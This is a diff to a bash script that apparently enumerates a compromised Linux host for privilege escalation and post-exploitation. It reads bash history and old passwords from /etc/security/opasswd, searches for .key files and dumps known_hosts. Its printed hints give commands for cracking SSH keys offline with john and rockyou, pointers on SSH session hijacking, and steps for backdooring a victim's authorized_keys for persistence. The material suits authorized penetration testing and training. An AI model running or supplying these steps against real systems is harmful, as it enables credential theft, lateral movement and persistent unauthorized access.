@@ -370,8 +370,11 @@ echo -e "\n${BLUE}╔═════{ User Bash History:${XX}"
     find / -iname *_history -xdev 2>/dev/null | xargs ls -ld
         if [ -f /home/$USER/.bash_history ]; 
             then
-                echo -e "\n${BLUE}    ══{ Reading User Bash History:${XX}"
-                cat /home/$USER/.bash_history
+                echo -e "\n${BLUE}    ══{ Reading last 100 User Bash History:${XX}"
+                tail -n 100 /home/$USER/.bash_history
+                    echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                    echo -e  "\t║If you want to read the whole file do: cat /home/$USER/.bash_history                                                ║"
+                    echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
             else
                 echo -e "  ${RED}File does not exist${XX}"
         fi
@@ -411,11 +414,6 @@ echo -e "\n${BLUE}╔═════{ User PHP History:${XX}"
         else
             echo -e "  ${RED}File does not exist${XX}"
     fi
-
-
-
-
-
 echo -e "\n${BLUE}╔═════{ /etc/security/opasswd file permission:${XX}"
     ls -la /etc/security/opasswd
 echo -e "\n${BLUE}╔═════{ Reading old passwords in /etc/security/opasswd:${XX}"
@@ -3633,6 +3631,12 @@ echo -e "\n${BLUE}╔═════{ ssh_config File:${XX}"
             ls -la /etc/ssh/ssh_config --color=always
             echo -e "\n${BLUE}    ══{ Reading ssh_config File:${XX}"
                 cat /etc/ssh/ssh_config
+            echo -e "\n${BLUE}    ══{ Is HashKnownHosts Enable:${XX}"
+                cat /etc/ssh/ssh_config | grep HashKnownHosts
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║If no, then we can read the content of ~/.ssh/known_hosts and try to break the hash.                                ║"
+                echo -e "\t║    https://github.com/chris408/known_hosts-hashcat                                                                 ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
         else
             echo -e "${RED}	File does not exist${XX}"
     fi
@@ -3680,6 +3684,37 @@ echo -e "\n${BLUE}╔═════{ Any active SSH session:${XX}"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If any session is found, the session can be hijacked. Read more about SSH session hijacking:                        ║"
         echo -e "\t║    https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/                                       ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}╔═════{ .key files:${XX}"
+    find / -name *.key -type f 2>/dev/null
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║Read the file and see if it has Proc-Type & DEK-Info which will indicate as an ssh key                              ║"
+        echo -e "\t║Usage: ssh -i xyz.key username@ip/domain                                                                            ║"
+        echo -e "\t║We can crack the key file offline:                                                                                  ║"
+        echo -e "\t║    python /usr/share/john/ssh2john.py xyz.key > xyz.hash                                                           ║"
+        echo -e "\t║    john --wordlist=/usr/share/wordlists/rockyou.txt ./xyz.hash                                                     ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}╔═════{ known_hosts:${XX}"
+     if [ -f ~/.ssh/known_hosts ]; 
+        then
+		    cat ~/.ssh/known_hosts
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║~/.ssh/known_hosts file list all machines that have been connected to recently. It’s possible we can connect to one ║"
+                echo -e "\t║of these other machines using the key. However, the HashKnownHosts setting maybe enabled in /etc/ssh/ssh_config,    ║"
+                echo -e "\t║so entries in the known_hosts file are hashed. Reading the file does not give us any useful information.            ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+echo -e "\n${BLUE}╔═════{ SSH Persistence:${XX}"
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║If we have write access to victim (user or root) ~/.ssh/authorized_keys file, we could simply append a new line to  ║"
+        echo -e "\t║authorized_keys and use it as a backdoor for us.                                                                    ║"
+        echo -e "\t║On Kali machine:                                                                                                    ║"
+        echo -e "\t║    ssh-keygen                                                                                                      ║"
+        echo -e "\t║    xclip -selection clipboard .ssh/id_rsa.pub                                                                      ║"
+        echo -e "\t║On Victim machine:                                                                                                  ║"
+        echo -e "\t║    echo 'ssh-rsa PASTE_bup-key_HERE' >> /home/USERNAME/.ssh/authorized_keys                                        ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n"
 echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
